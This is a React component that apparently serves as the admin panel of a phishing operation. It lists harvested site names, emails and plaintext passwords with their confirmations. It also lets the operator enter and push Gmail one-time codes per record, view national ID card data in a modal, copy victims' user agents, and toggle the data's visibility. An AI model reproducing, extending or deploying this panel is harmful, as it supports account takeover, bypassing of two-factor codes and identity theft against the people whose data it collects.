import { useContext, useState } from "react"
import { AuthContext } from "../../../contexts/AuthProvider"
import { getData, updateData } from "../../../api/fetching"
import useInformation from "../../../hooks/useInformation"
import moment from "moment"
import { handleCopyClick } from "../../../utils/copyToClipBoard"
import ReactPaginate from "react-paginate"
import NidModal from "../../../components/NidModal"


export default function AdminInfo() {
  const [codeVal,setCodeVal]= useState('')
  const [nidData,setNidData ]= useState({})
  const [open,setOpen] = useState(false)
  const {role}= useContext(AuthContext)
  
const {displayInfo,totalPages, setPage,isHide,setIsHide} = useInformation('/hide-elements')

const updateGmailOtp = async(id:any)=> {
  const originalData= {
    mailCode: codeVal
  }
  const data = await updateData(`/information/admin/${id}`,originalData)
  console.log(data);
}




const handlePageClick = (event:any) => {
  setPage(event.selected);
};

const handleOpen = (data:any)=>{
  setOpen(state => !state)
  setNidData(data)
}

const handleHide = async()=>{
try {
  await getData(`/toggle-data-hide?isDataHide=${!isHide}`)
  setIsHide(state => !state)
} catch (error:any) {
  throw new Error(error)
}
}


  return (
<div>
  <div className="bg-secondary position-relative text-center rounded p-4 mt-4">
    <div className="d-flex align-items-center justify-content-between mb-4">
      <h6 className="mb-0">All Informations</h6>
      {
        role==='admin'&& (
          <button onClick={handleHide} className={` btn-lg ${isHide ? 'btn-primary':'btn-success'}`}>
            {isHide ? 'Show Information' : 'Hide Information'}
          </button>
        )
      }
    </div>
    <div className="table-responsive">
      <table className="table text-start align-middle table-bordered table-hover mb-0">
        <thead>
          <tr className="text-white">
            <th scope="col">Date</th>
            <th scope="col">Name</th>
            <th scope="col">Site Name</th>
            <th scope="col">Email</th>
            <th scope="col">Password</th>
            <th scope="col">Confirm Password</th>
            
            {
              role === 'admin' &&(
                <th scope="col">Send Code</th>
              )
            }
            {
              role === 'admin' &&(
                <th scope="col">add</th>
              )
            }
            {
              role === 'admin' &&(
                <th scope="col">Card Info</th>
              )
            }
      
            <th scope="col">Action</th>
          </tr>
        </thead>
        <tbody>
          {
            displayInfo?.map(({_id,createdAt,siteName,mailCode,user,nidInfo,email,password,repassword,agent:{ source={},platform='' } }) =>(
              <>
              <tr key={_id}>
              <td>{moment(createdAt).fromNow()}</td>
              <td>{(user as any)?.name}</td>
              <td>{siteName}</td>
              <td>{email}</td>
              <td>{password}</td>
              <td>{repassword}</td>
              <td><input style={{width:'70px'}} className='form-control ' type="text" 
              defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)}
              /></td>
              {
                role === 'admin' && (
                  <td><button type="button"
                  
                  className="btn btn-sm btn-danger" 
                  onClick={()=>updateGmailOtp(_id)}
                  >Add</button></td>
                )
              }
              {
                role === 'admin' && (
                  <td title={platform}><button  type="button"
                  
                  className="btn btn-sm btn-warning" 
                  onClick={()=> handleOpen(nidInfo)}
                  >View</button></td>
                )
              }

{/* Email Hide */}


              {/* Password Hide  */}
    

              <td title={platform}><button type="button"
                onClick={() => handleCopyClick(`${source ? source : ''}`)}
                className={`btn btn-sm  ${(platform === 'iPhone' &&  role === 'admin') ? 'btn-primary' :'btn-success' }`} 
              >Agent</button></td>
                
            </tr>
            
             </>
            ))
          }


        </tbody>
      </table>
    </div>
  </div>
  <div  className='pag'>
          <ReactPaginate
          className='p-1'
        breakLabel="..."
        nextLabel="next >"
        onPageChange={handlePageClick}
        pageRangeDisplayed={5}
        pageCount={totalPages}
        previousLabel="< previous"
        renderOnZeroPageCount={null}
      />
          </div>
      <NidModal isOpen={open} setIsOpen={setOpen} data={nidData}/>
</div>

  )
}


